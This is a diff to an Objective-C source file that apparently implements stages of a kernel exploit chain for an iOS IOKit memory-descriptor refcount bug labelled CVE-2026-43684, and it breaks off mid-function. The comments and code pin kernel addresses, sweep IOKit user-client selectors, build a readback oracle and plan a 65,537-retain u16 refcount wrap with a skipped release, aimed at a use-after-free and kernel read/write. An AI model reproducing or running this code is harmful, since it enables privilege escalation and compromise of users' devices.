@@ -1,19 +1,33 @@
 //
 //  P101DmaCommandFire.m
-//  CVE-2026-43684 dmaCommandOperation — bounded REUSE fire.
+//  CVE-2026-43684 IOMD dmaref KRW-composition chain — v2.
 //
-//  Ghidra 23F77 cve43684_IOMD_dmaCommandOperation 0xfffffff00a507dbc:
-//    IOMD+0x68 is the counter (pre-26.x name +0x34). First call iVar2==0
-//    sets dmaCommand+0x60 addr / +0x68 len. Second call with SAME addr+len
-//    while IOMD+0x68 != 0 returns SUCCESS and only increments.
-//    param_4!=0 && (IOMD+0x64 & 0xf)==2 is the teardown callback (UAF shape).
-//  P069 only did makeMapping (increment at +0x68 via map, not this fn).
-//  P086 IOGPU sel 0..40 x zero-args = 0 fingerprint hits.
+//  VERIFIED 23F77 LAW (2026-10-26 hunt, /tmp/calif_demo/re_iomd23.md):
+//    - dmaref refcount = u16 at md+0x34. RETAIN = ldaddh +1 @0xfffffff00a511624
+//      (second site 0xa515dc4) — NO ceiling, post-add check is on the OLD value.
+//      DEC = 0xa5116d0 (ldaddh -1; pre-0 = PANIC "_dmaReferences underflow"
+//      @0xfffffff0070b27ec; old==1 -> teardown bl 0x9f1975c).
+//    - op-6 RELEASE DISPATCHER = 0xfffffff00a515d60: case-6 @0xa515f88 reads
+//      [x0+0x98]; ==0 -> RELEASE SKIPPED ENTIRELY. [x0+0x98] = u32 mapped
+//      16K-page count (worker 0xa50737c computes; unmap-arm 0xa5073c4 resets 0).
+//    - GATE ORACLE: sel-2 (case-1) of the SAME dispatcher copies [x0+0x98]
+//      into the out-struct at +0xc — app-readable without kread.
+//    - TWIN 0xa511324 = UNGATED dec (panic on underflow). The fire must route
+//      through 0xa515d60-class wrappers only.
+//    - UC hop (P069 proven): IOSurface -> memory entry -> mach_vm_map;
+//      lane sels probed on the SAME connections via struct-method calls.
 //
-//  This TAP: CacheMode PurpleGfxMem MD + real addr/len, then ONE setup and
-//  ONE reuse on the first fingerprint or SUCCESS. No unbounded loop.
-//  One teardown-shaped call (param_4=1). Does not set hasKread.
-//  Isolate: reboot after T7 phys-map-3. Do not stack on T4/T7.
+//  Four phases, one tap, every phase fsync-logged, honest early-outs:
+//    1. ARM-ORACLE — P069 map path + sel-2-class gate reads, map/unmap
+//       correlation round (a corroborated oracle is the panic guard below).
+//    2. RETAIN-WRAP — v1 reuse machinery on the identified acquire lane,
+//       65,537 retains (u16 wrap + first-ref arm), 4096/round, abort on
+//       first non-SUCCESS.
+//    3. UNMAP-ARM + RELEASE-SKIP — unmap (arm resets +0x98 to 0), release
+//       call routed on the SAME lane, verify SKIP via oracle + subsequent op.
+//    4. VERDICT — honest: the wrap is a LEAD-quality event (no direct u16
+//       read without KRW); the UAF / page-list confusion is NOT attempted
+//       in this build (that is the next tap).
 //
 
 #import "P101DmaCommandFire.h"
@@ -25,19 +39,37 @@
 #import <IOKit/IOKitLib.h>
 #import <CoreFoundation/CoreFoundation.h>
 #import <mach/mach.h>
+#import <mach/mach_time.h>
 #import <dlfcn.h>
 #import <fcntl.h>
 #import <stdio.h>
 #import <string.h>
 #import <unistd.h>
 
-#define P101_BUILD @"p101-43684-reuse-v5"
+#define P101_BUILD @"p101-iomd-chain-v2"
 #define P101_TAG   @"p101"
-#define P101_LEN   0x4000ull
 
-#define P101_KR_REUSE  0xe00002d8u
-#define P101_KR_ALIGN  0xe00002d0u
-#define P101_KR_LEN    0xe00002dbu
+/* 4 x 16K pages — the gate field is a mapped-16K-page count, so a 4-page
+   window gives the oracle a distinctive 0 <-> 4 swing to corroborate on. */
+#define P101_SURF_LEN 0x10000ull
+#define P101_PAGE_LEN 0x4000ull
+#define P101_SURF_PAGES 4u
+
+/* 0x10000 retains = the u16 wrap-through; one MORE retain then takes the
+   first-ref arm (old==0 -> re-arms [md+0x38] and re-acquires the sharing
+   ctx) = the ctx-ref leak marker. 16 rounds x 4096 + 1. */
+#define P101_WARP_TARGET  0x10001ull
+#define P101_BATCH        4096u
+#define P101_ROUNDS       16u
+
+#define P101_ORACLE_SELS  25u      /* sel 0..24 census, as v1 */
+#define P101_MAX_CONNS    8u
+#define P101_MAX_ORACLES  4u
+
+/* dispatcher case-1 (sel-2 class): min sizes the lane enforces are 0x20+
+   for the arg struct; the +0xc readback lands in the out-struct. */
+#define P101_IN_SZ        0x20u
+#define P101_OUT_SZ       0x40u
 
 kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                           mach_vm_size_t size, mach_vm_offset_t mask, int flags,
@@ -56,15 +88,25 @@ kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
 typedef void *(*p101_isc_t)(CFDictionaryRef);
 typedef void *(*p101_isbase_t)(void *);
 typedef size_t (*p101_issz_t)(void *);
-typedef mach_port_t (*p101_isport_t)(void *);
 typedef void *(*p101_dev_create_t)(io_service_t);
 typedef uint32_t (*p101_get_conn_t)(void *);
 typedef void (*p101_dev_release_t)(void *);
+/* AVEOpenSmoke precedent: struct-method through dlsym, not a header claim. */
+typedef kern_return_t (*p101_csm_t)(mach_port_t, uint32_t,
+                                    const void *, size_t, void *, size_t *);
 
-static int p101_is_fp(kern_return_t kr) {
-    return kr == (kern_return_t)P101_KR_REUSE ||
-           kr == (kern_return_t)P101_KR_ALIGN ||
-           kr == (kern_return_t)P101_KR_LEN;
+typedef struct {
+    io_connect_t conn;
+    uint32_t     sel;
+    /* three correlation samples: mapped / unmapped / remapped */
+    uint32_t     s_map, s_unmap, s_remap;
+    int          corroborated;   /* changed with the map cycle */
+    int          alive;
+} p101_oracle_t;
+
+static uint32_t p101_gate_w(const uint8_t *out, size_t outsz) {
+    if (!out || outsz < 0x10) return 0xffffffffu;
+    uint32_t w; memcpy(&w, out + 0xc, 4); return w;
 }
 
 @implementation P101DmaCommandFire
@@ -79,65 +121,74 @@ static int p101_is_fp(kern_return_t kr) {
         [log appendString:out];
         if (fd >= 0) { const char *p = out.UTF8String; if (p) write(fd, p, strlen(p)); }
     };
+    void (^SYNC)(void) = ^{ if (fd >= 0) fcntl(fd, F_FULLFSYNC); };
 
     L([NSString stringWithFormat:@"=== p101 session %@ BUILD %@ ===",
        LabLocalMilitaryNow() ?: @"?", P101_BUILD]);
-    L(@"CVE-2026-43684 dmaCommandOperation REUSE fire. Isolate from T7. One setup + one reuse.");
-    L(@"Ghidra 23F77: counter is IOMD+0x68 (pre-26 name +0x34). dmaCommand at IOMD+0x70.");
-    L(@"Callers FUN_fffffff0098d2e7c / 0099bed38 / 0099bf64c (vtable). P086 had 0 FP hits.");
-    L(@"No hop-1. No Titan ROP. No unbounded increment loop. hasKread unchanged.");
+    L(@"CVE-2026-43684 IOMD dmaref chain v2. 23F77 law: u16 dmaref md+0x34");
+    L(@"(retain ldaddh+1 0xa511624 / 0xa515dc4, NO ceiling), op-6 release");
+    L(@"dispatcher 0xa515d60 gated on [md+0x98] (u32 mapped 16K-page count),");
+    L(@"gate oracle = sel-2 copy of [x0+0x98] -> out+0xc. TWIN 0xa511324 is");
+    L(@"the UNGATED dec (panic) — release must route through 0xa515d60-class.");
+    L(@"UAF / page-list confusion NOT attempted in this build.");
     L([LabDeviceProfile identBlock] ?: @"ident=?");
 
+    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p101"];
+    if (stop) {
+        L(stop);
+        L(@"[-] chain HOLD — the +0x34/+0x98 law is proven on 23F77 pins only.");
+        if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
+        return log;
+    }
     const LabOffTab *off = LabOff();
     if (off && off->tag && strcmp(off->tag, "A14_23F77") == 0) {
-        L(@"[MAP] A14 unslid dmaCommandOperation 0xfffffff00a507dbc makeMapping 0xfffffff00a512314");
+        L(@"[MAP] A14 unslid pins: dmaCommandOperation 0xfffffff00a507dbc");
+        L(@"      makeMapping 0xfffffff00a512314  retain 0xa511624  dec 0xa5116d0");
+        L(@"      op6-dispatcher 0xa515d60  twin(panic) 0xa511324  worker 0xa50737c");
+        L(@"      unmap-arm reset 0xa5073c4  freepool 0xa903db0");
     } else {
-        L([NSString stringWithFormat:@"[*] table=%s — T8101 dmaCommand VA not pasted.",
+        L([NSString stringWithFormat:@"[!] table=%s — PINS HOLD, law rows unverified on this SKU.",
            off && off->tag ? off->tag : "NULL"]);
     }
 
+    /* ---------- PREP: surf + memory entry + window (P069 map path) ------- */
     void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
     if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
     p101_isc_t pCreate = ios ? (p101_isc_t)dlsym(ios, "IOSurfaceCreate") : NULL;
     p101_isbase_t pBase = ios ? (p101_isbase_t)dlsym(ios, "IOSurfaceGetBaseAddress") : NULL;
     p101_issz_t pSz = ios ? (p101_issz_t)dlsym(ios, "IOSurfaceGetAllocSize") : NULL;
-    p101_isport_t pPort = ios ? (p101_isport_t)dlsym(ios, "IOSurfaceCreateMachPort") : NULL;
-    if (!pCreate) {
-        L(@"[-] IOSurfaceCreate absent");
+    if (!pCreate || !pBase) {
+        L(@"[-] IOSurfaceCreate/GetBaseAddress absent — nothing to arm. STOP.");
         if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
         return log;
     }
 
-    int64_t sz = (int64_t)P101_LEN;
-    int64_t mode = 0x100;
-    CFNumberRef nSz = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sz);
-    CFNumberRef nMode = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &mode);
+    int64_t sSz = (int64_t)P101_SURF_LEN;
+    CFNumberRef nSz = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sSz);
     CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
         &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), nSz);
-    CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
-    CFDictionarySetValue(dict, CFSTR("IOSurfaceCacheMode"), nMode);
     void *surf = pCreate(dict);
-    L([NSString stringWithFormat:@"[*] CacheMode 0x100 PurpleGfxMem create -> %p", surf]);
-    if (!surf) {
-        CFDictionaryRemoveValue(dict, CFSTR("IOSurfaceCacheMode"));
-        surf = pCreate(dict);
-        L([NSString stringWithFormat:@"[*] retry without CacheMode -> %p", surf]);
-    }
-    void *base = (surf && pBase) ? pBase(surf) : NULL;
+    void *base = surf ? pBase(surf) : NULL;
     size_t asz = (surf && pSz) ? pSz(surf) : 0;
-    L([NSString stringWithFormat:@"[*] base=%p size=0x%zx", base, asz]);
-    if (base && asz >= 8) memset(base, 0x11, asz > P101_LEN ? (size_t)P101_LEN : asz);
+    L([NSString stringWithFormat:@"[*] surface %p base=%p size=0x%zx (want 0x%llx = %u x 16K pages)",
+       surf, base, asz, (unsigned long long)P101_SURF_LEN, P101_SURF_PAGES]);
+    if (!surf || !base || asz < P101_SURF_LEN) {
+        L(@"[-] surface/arm missing — nothing to arm. STOP.");
+        CFRelease(dict); CFRelease(nSz);
+        if (surf) CFRelease(surf);
+        SYNC();
+        if (fd >= 0) close(fd);
+        return log;
+    }
+    memset(base, 0x11, (size_t)P101_SURF_LEN);
 
     mach_port_t mdport = MACH_PORT_NULL;
     mach_vm_address_t mapped = 0;
-    /* v2 (2026-10-19): P069/P101 both fed mach_vm_map the IOSurface UC port
-       and got kr=0x1d=KERN_INVALID_OBJECT — a UC send right is NOT a memory
-       object. p019v2 and p084 proved on this device that
-       mach_make_memory_entry_64 over the surface base IS (kr=0x0, port that
-       mach_vm_map accepts). Same pattern as P084 lines ~150. */
-    if (surf && base) {
-        memory_object_size_t esz = asz ? (memory_object_size_t)asz : (memory_object_size_t)P101_LEN;
+    /* P069 proven hop: UC send rights are NOT memory objects (kr=0x1d);
+       a memory entry over the surface base IS (p019v2 + p084, kr=0x0). */
+    {
+        memory_object_size_t esz = (memory_object_size_t)P101_SURF_LEN;
         mem_entry_name_port_t entry = 0;
         kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &esz,
             (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
@@ -145,23 +196,94 @@ static int p101_is_fp(kern_return_t kr) {
            (unsigned)ekr, (unsigned long long)esz, (unsigned)entry]);
         if (ekr == KERN_SUCCESS && entry) {
             mdport = entry;
-            mach_vm_size_t msz = asz ? (mach_vm_size_t)asz : (mach_vm_size_t)P101_LEN;
+            mach_vm_size_t msz = (mach_vm_size_t)P101_SURF_LEN;
             kern_return_t mkr = mach_vm_map(mach_task_self(), &mapped, msz, 0, 1,
                                             mdport, 0, false, VM_PROT_READ | VM_PROT_WRITE,
                                             VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
-            L([NSString stringWithFormat:@"[*] mach_vm_map kr=0x%x addr=0x%llx",
+            L([NSString stringWithFormat:@"[*] mach_vm_map kr=0x%x addr=0x%llx (P069 makeMapping consumer)",
                (unsigned)mkr, (unsigned long long)mapped]);
             if (mkr != KERN_SUCCESS) mapped = 0;
         }
     }
+    if (!mapped) {
+        L(@"[-] window map failed — Phase-1 correlation UNAVAILABLE; census-only fallback follows.");
+        if (mdport) mach_port_deallocate(mach_task_self(), mdport);
+    }
 
+    /* ---------- connections (P069/P101-proven set, bounded) -------------- */
+    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
+    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
+    p101_dev_create_t pDevCreate = iogpu ? (p101_dev_create_t)dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
+    p101_get_conn_t pGetConn = iogpu ? (p101_get_conn_t)dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
+    p101_dev_release_t pDevRelease = iogpu ? (p101_dev_release_t)dlsym(iogpu, "IOGPUDeviceRelease") : NULL;
+
+    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+    p101_csm_t csm = (p101_csm_t)dlsym(iokit ? iokit : RTLD_DEFAULT, "IOConnectCallStructMethod");
+    L([NSString stringWithFormat:@"[*] IOConnectCallStructMethod=%p (struct lane reads)", csm]);
+    if (!csm) L(@"[!] struct-method absent — oracle reduced to scalar census only.");
+
+    io_connect_t conns[P101_MAX_CONNS];
+    char connWho[P101_MAX_CONNS][64];
+    unsigned nConn = 0;
+    io_service_t gpu = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
+    void *dev = NULL;
+    if (gpu && pDevCreate) {
+        dev = pDevCreate(gpu);
+        io_connect_t gc = (dev && pGetConn) ? (io_connect_t)pGetConn(dev) : 0;
+        if (gc) { conns[nConn] = gc; snprintf(connWho[nConn], 64, "IOGPU"); nConn++; }
+        L([NSString stringWithFormat:@"[*] IOGPUDeviceCreate %p conn=%u", dev, gc]);
+    }
+    if (gpu) IOObjectRelease(gpu);
+    const char *svcs[] = { "IOSurfaceRoot", "IOMobileFramebuffer", "AppleAVE2Driver",
+                           "AppleM2ScalerCSCDriver", "AppleT8020DART", "IODARTFamily", NULL };
+    for (int i = 0; svcs[i] && nConn < P101_MAX_CONNS; i++) {
+        io_iterator_t it = 0;
+        if (IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching(svcs[i]), &it) != KERN_SUCCESS || !it) continue;
+        io_service_t svc;
+        while ((svc = IOIteratorNext(it)) && nConn < P101_MAX_CONNS) {
+            for (uint32_t ty = 0; ty < 2 && nConn < P101_MAX_CONNS; ty++) {
+                io_connect_t c = 0;
+                if (IOServiceOpen(svc, mach_task_self(), ty, &c) == KERN_SUCCESS && c) {
+                    conns[nConn] = c;
+                    snprintf(connWho[nConn], 64, "%s/t%u", svcs[i], ty);
+                    nConn++;
+                }
+            }
+            IOObjectRelease(svc);
+        }
+        IOObjectRelease(it);
+    }
+    L([NSString stringWithFormat:@"[*] %u UC connections open (bounded set)", nConn]);
+
+    /* name lookup used by oracle + release lines */
+    NSString *(^connOf)(io_connect_t) = ^(io_connect_t c) {
+        for (unsigned i = 0; i < nConn; i++)
+            if (conns[i] == c) return [NSString stringWithUTF8String:connWho[i]];
+        return @"?";
+    };
+
+    /* ---------- lane state + helpers ------------------------------------- */
+    __block io_connect_t acquireConn = 0;
+    __block uint32_t acquireSel = 0xffffffffu;
     uint64_t va = (uint64_t)(uintptr_t)base;
-    uint64_t len = asz ? (uint64_t)asz : P101_LEN;
-    __block unsigned fp = 0, setups = 0, reuses = 0, teardowns = 0, fired = 0;
+    uint64_t len = (uint64_t)P101_SURF_LEN;
 
-    void (^try_shape)(io_connect_t, const char *, uint32_t, uint64_t, uint64_t, uint32_t) =
-    ^(io_connect_t conn, const char *who, uint32_t sel, uint64_t addr, uint64_t n, uint32_t p4) {
-        if (fired) return;
+    /* sel-2-class GATE READ: struct-method call, oracle = out+0xc */
+    kern_return_t (^gateRead)(io_connect_t, uint32_t, uint8_t *, size_t *) =
+    ^(io_connect_t conn, uint32_t sel, uint8_t *outb, size_t *outsz) {
+        if (!conn || !csm) return (kern_return_t)0xe00002c2;
+        uint8_t inb[P101_IN_SZ];
+        memset(inb, 0, sizeof(inb));
+        *outsz = P101_OUT_SZ;
+        return csm((mach_port_t)conn, sel, inb, sizeof(inb), outb, outsz);
+    };
+
+    /* v1 FIRE machinery (bounded shape): setup(addr/len,p4=0) + one reuse +
+       provocation pass + one teardown-shaped call. Returns kr of the setup. */
+    kern_return_t (^tryShape)(io_connect_t, const char *, uint32_t, uint64_t, uint64_t, uint32_t,
+                              uint8_t *, size_t) =
+    ^(io_connect_t conn, const char *who, uint32_t sel, uint64_t addr, uint64_t n, uint32_t p4,
+      uint8_t *outb, size_t outszMax) {
         uint8_t in[32];
         memset(in, 0, sizeof(in));
         memcpy(in, &addr, 8);
@@ -169,206 +291,374 @@ static int p101_is_fp(kern_return_t kr) {
         uint32_t p5 = 0;
         memcpy(in + 16, &p4, 4);
         memcpy(in + 20, &p5, 4);
-        uint8_t outb[64];
-        size_t outsz = sizeof(outb);
+        size_t outsz = outszMax;
+        uint8_t outbuf[P101_OUT_SZ];
+        uint8_t *ob = outb ? outb : outbuf;
+        if (!outb) outsz = sizeof(outbuf);
         uint64_t scOut[4] = {0};
         uint32_t scOutCnt = 4;
         kern_return_t kr = IOConnectCallMethod(conn, sel, NULL, 0, in, 24,
-                                               scOut, &scOutCnt, outb, &outsz);
-        int hit = p101_is_fp(kr);
-        if (hit || (kr != 0xe00002c2 && kr != 0xe00002c1 && kr != 0xe00002c7 &&
-                    kr != 0xe00002e2 && kr != 0xe00002be && kr != 0xe00002bc)) {
-            L([NSString stringWithFormat:@"    %s sel=%u addr=0x%llx len=0x%llx p4=%u kr=0x%x%s",
-               who, sel, (unsigned long long)addr, (unsigned long long)n, p4, kr,
-               p101_is_fp(kr) ? " FP" : (kr == KERN_SUCCESS ? " OK" : "")]);
-        }
-        if (p101_is_fp(kr)) fp++;
-        if (kr == KERN_SUCCESS) setups++;
-        /* v3: SUCCESS no longer promotes fire or stops the sweep (v2's
-           "P101 FIRED" was any benign 24-byte selector accepting addr=0).
-           A plain success instead gets the FINGERPRINT PROVOCATION pass:
-           the 43684 consumer answers one of these with the xnu-class codes. */
-        if (kr == KERN_SUCCESS && p4 == 0 && !fired) {
-            kern_return_t krx;
-            /* (1) reuse same addr+len — counter increment path */
-            outsz = sizeof(outb); scOutCnt = 4;
-            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (IOMD+0x68 increment path)",
-               who, sel, krx]);
-            reuses++;
-            if (p101_is_fp(krx)) { fp++; fired = 1; goto teardown_probe; }
-            /* (2) reuse with a DIFFERENT va — mismatch should hit 0xe00002d8 */
-            uint64_t addr2 = addr ^ 0x4000ULL;
-            memcpy(in, &addr2, 8);
-            outsz = sizeof(outb); scOutCnt = 4;
-            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    MISMATCH %s sel=%u addr2=0x%llx kr=0x%x (want 0xe00002d8)",
-               who, sel, (unsigned long long)addr2, krx]);
-            if (p101_is_fp(krx)) { fp++; fired = 1; goto teardown_probe; }
-            /* (3) length over MD — should hit 0xe00002db */
-            uint64_t n2 = n * 2;
-            memcpy(in + 8, &n2, 8);
-            outsz = sizeof(outb); scOutCnt = 4;
-            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    OVERLEN %s sel=%u n2=0x%llx kr=0x%x (want 0xe00002db)",
-               who, sel, (unsigned long long)n2, krx]);
-            if (p101_is_fp(krx)) { fp++; fired = 1; goto teardown_probe; }
-            /* (4) misaligned va — should hit 0xe00002d0 */
-            uint64_t addr3 = (addr2 | 0x8ULL);
-            memcpy(in, &addr3, 8);
-            memcpy(in + 8, &n, 8);
-            outsz = sizeof(outb); scOutCnt = 4;
-            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    MISALIGN %s sel=%u addr=0x%llx kr=0x%x (want 0xe00002d0)",
-               who, sel, (unsigned long long)addr3, krx]);
-            if (p101_is_fp(krx)) { fp++; fired = 1; }
-        teardown_probe:
-            /* teardown-shaped p4=1 (callback if IOMD+0x64&0xf==2). ONE call,
-               same addr/len as the setup — only on a promising selector. */
-            memcpy(in, &addr, 8);
-            memcpy(in + 8, &n, 8);
-            uint32_t p4t = 1;
-            memcpy(in + 16, &p4t, 4);
-            outsz = sizeof(outb); scOutCnt = 4;
-            krx = IOConnectCallMethod(conn, sel, NULL, 0, in, 24, scOut, &scOutCnt, outb, &outsz);
-            L([NSString stringWithFormat:@"    TEARDOWN-SHAPED p4=1 %s sel=%u kr=0x%x",
-               who, sel, krx]);
-            teardowns++;
-        }
+                                               scOut, &scOutCnt, ob, &outsz);
+        L([NSString stringWithFormat:@"    %s sel=%u addr=0x%llx len=0x%llx p4=%u kr=0x%x%s",
+           who, sel, (unsigned long long)addr, (unsigned long long)n, p4, kr,
+           kr == KERN_SUCCESS ? " OK" : ""]);
+        return kr;
     };
 
-    void (^sweep_conn)(io_connect_t, const char *) = ^(io_connect_t conn, const char *who) {
-        if (!conn || fired) return;
-        L([NSString stringWithFormat:@"[FIRE] %s conn=%u sel 0..24 offset0 then va", who, conn]);
-        for (uint32_t sel = 0; sel <= 24 && !fired; sel++) {
-            try_shape(conn, who, sel, 0, len, 0);
-            if (fired) break;
-            if (va) try_shape(conn, who, sel, va, len, 0);
-        }
-    };
-
-    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
-    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
-    p101_dev_create_t pDevCreate = iogpu ? (p101_dev_create_t)dlsym(iogpu, "IOGPUDeviceCreate") : NULL;
-    p101_get_conn_t pGetConn = iogpu ? (p101_get_conn_t)dlsym(iogpu, "IOGPUDeviceGetConnect") : NULL;
-    p101_dev_release_t pDevRelease = iogpu ? (p101_dev_release_t)dlsym(iogpu, "IOGPUDeviceRelease") : NULL;
-
-    io_service_t gpu = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOGPU"));
-    void *dev = NULL;
-    if (gpu && pDevCreate) {
-        dev = pDevCreate(gpu);
-        io_connect_t gc = (dev && pGetConn) ? (io_connect_t)pGetConn(dev) : 0;
-        L([NSString stringWithFormat:@"[*] IOGPUDeviceCreate %p conn=%u", dev, gc]);
-        sweep_conn(gc, "IOGPU/DeviceCreate");
-    }
-    if (gpu) IOObjectRelease(gpu);
-    if (dev && pDevRelease) pDevRelease(dev);
-
-    const char *svcs[] = {
-        "IOSurfaceRoot", "IOMobileFramebuffer",
-        "AppleAVE2Driver", "AppleM2ScalerCSCDriver", "AppleT8020DART", "H11ANEIn",
-        /* v4: the 23F77 VA map puts every 43684 call site in the kernel's own
-           __TEXT_EXEC (generic IOKit/Mach) — the consumer is whichever UC
-           builds an IOMD and submits DMA. Sweep the DMA-engine UCs now. */
-        "AppleS8000AES", "ApplePIODMA", "AudioDMAController-T8101", "IODARTFamily",
-        "AppleT8101PCIe", "IOSlowAdaptiveClockingFamily", NULL
-    };
-    for (int i = 0; svcs[i] && !fired; i++) {
-        io_iterator_t it = 0;
-        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
-                                                        IOServiceMatching(svcs[i]), &it);
-        if (kr != KERN_SUCCESS || !it) {
-            L([NSString stringWithFormat:@"[*] %s: no match", svcs[i]]);
-            continue;
-        }
-        io_service_t svc;
-        unsigned n = 0;
-        while ((svc = IOIteratorNext(it)) && n < 2 && !fired) {
-            for (uint32_t ty = 0; ty < 2 && !fired; ty++) {
-                io_connect_t c = 0;
-                kern_return_t okr = IOServiceOpen(svc, mach_task_self(), ty, &c);
-                if (okr != KERN_SUCCESS) {
-                    if (okr != 0xe00002c2 && okr != 0xe00002e2 && okr != 0xe00002c1)
-                        L([NSString stringWithFormat:@"    %s open type=%u kr=0x%x", svcs[i], ty, okr]);
-                    continue;
+    /* ---------- PHASE 1 — ARM-ORACLE (map/unmap correlation) ------------- */
+    L(@"--- PHASE 1 ARM-ORACLE ---");
+    p101_oracle_t oracles[P101_MAX_ORACLES];
+    unsigned nOracle = 0;
+    __block uint64_t t0 = mach_absolute_time();
+    if (mapped) {
+        for (unsigned ci = 0; ci < nConn; ci++) {
+            for (uint32_t sel = 0; sel < P101_ORACLE_SELS; sel++) {
+                uint8_t outb[P101_OUT_SZ];
+                size_t outsz = sizeof(outb);
+                kern_return_t kr = gateRead(conns[ci], sel, outb, &outsz);
+                if (kr != KERN_SUCCESS) continue;
+                if (outsz < 0x10) continue;
+                uint32_t w = p101_gate_w(outb, outsz);
+                L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x hex(0..f)=%02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x %02x%02x%02x%02x",
+                   connWho[ci], sel, w,
+                   outb[0], outb[1], outb[2], outb[3],
+                   outb[4], outb[5], outb[6], outb[7],
+                   outb[8], outb[9], outb[10], outb[11],
+                   outb[12], outb[13], outb[14], outb[15]]);
+                if (nOracle < P101_MAX_ORACLES) {
+                    oracles[nOracle].conn = conns[ci];
+                    oracles[nOracle].sel = sel;
+                    oracles[nOracle].s_map = w;
+                    oracles[nOracle].s_unmap = 0xffffffffu;
+                    oracles[nOracle].s_remap = 0xffffffffu;
+                    oracles[nOracle].corroborated = 0;
+                    oracles[nOracle].alive = 1;
+                    nOracle++;
                 }
-                char who[80];
-                snprintf(who, sizeof(who), "%s/t%u", svcs[i], ty);
-                sweep_conn(c, who);
-                IOServiceClose(c);
             }
-            IOObjectRelease(svc);
-            n++;
         }
-        IOObjectRelease(it);
-    }
-
-    /* v4 DYNAMIC pass: walk every registry entry on the IOService plane,
-       sweep UCs whose class name carries a DMA/DART/AES engine substring.
-       v4's IOServiceMatching("IOService") matched nothing (real run 19:37);
-       the plane iterator is the correct enumeration. 8 instances max. */
-    if (!fired) {
-        io_iterator_t it = 0;
-        kern_return_t kr = IORegistryEntryCreateIterator(kIOMainPortDefault, kIOServicePlane,
-            kIORegistryIterateRecursively, &it);
-        if (kr == KERN_SUCCESS && it) {
-            L(@"[FIRE] dynamic registry pass (class name contains DMA/DART/AES)");
-            io_registry_entry_t svc;
-            unsigned opened = 0;
-            /* registry iterators are plain io_iterator_t — IOIteratorNext
-               walks them (IORegistryIteratorNextEntry is not in the iOS SDK). */
-            while ((svc = (io_registry_entry_t)IOIteratorNext(it)) && opened < 8) {
-                char cls[128] = {0};
-                io_name_t c2;
-                if (IOObjectGetClass(svc, c2) == KERN_SUCCESS) {
-                    snprintf(cls, sizeof(cls), "%s", c2);
+        /* map/unmap/map cycle on the P069 window; resample the candidates */
+        for (unsigned oi = 0; oi < nOracle && mapped; oi++) {
+            kern_return_t dkr = mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
+            if (dkr == KERN_SUCCESS) mapped = 0;
+            L([NSString stringWithFormat:@"[*] UNMAP kr=0x%x (P069 unmap arm)", (unsigned)dkr]);
+            uint8_t outb[P101_OUT_SZ];
+            size_t outsz = sizeof(outb);
+            kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
+            if (kr == KERN_SUCCESS && outsz >= 0x10) {
+                oracles[oi].s_unmap = p101_gate_w(outb, outsz);
+            } else {
+                oracles[oi].alive = 0;
+                L([NSString stringWithFormat:@"    ORACLE-UNMAP %@ sel=%u FAILED kr=0x%x",
+                   connOf(oracles[oi].conn), oracles[oi].sel, kr]);
+                continue;
+            }
+            mach_vm_address_t nm = 0;
+            mach_vm_size_t msz = (mach_vm_size_t)P101_SURF_LEN;
+            kern_return_t mkr = mach_vm_map(mach_task_self(), &nm, msz, 0, 1, mdport, 0, false,
+                                            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+                                            VM_INHERIT_NONE);
+            if (mkr == KERN_SUCCESS) mapped = nm;
+            L([NSString stringWithFormat:@"[*] REMAP kr=0x%x addr=0x%llx", (unsigned)mkr, (unsigned long long)mapped]);
+            outsz = sizeof(outb);
+            kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
